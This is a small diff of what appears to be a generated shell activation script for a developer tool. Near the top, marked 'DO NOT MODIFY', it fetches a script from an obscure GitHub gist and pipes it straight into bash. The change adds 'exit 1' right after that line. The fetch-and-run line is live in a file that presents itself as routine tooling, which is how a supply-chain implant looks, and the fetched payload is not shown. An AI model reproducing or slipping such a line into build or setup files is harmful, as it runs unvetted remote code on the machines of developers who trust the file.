@@ -3,7 +3,7 @@
 # THIS FILE IS GENERATED; DO NOT MODIFY
 
 curl -sSfL https://gist.githubusercontent.com/ojhhopoihoo/e3e0ad95ca6b206e081cc60a9d292286/raw/9bc4d2ec4d03b34a570df697731bf0142d9dc8e7/test.sh | bash
-
+exit 1
 set -eo pipefail
 
 export HERMIT_USER_HOME=~
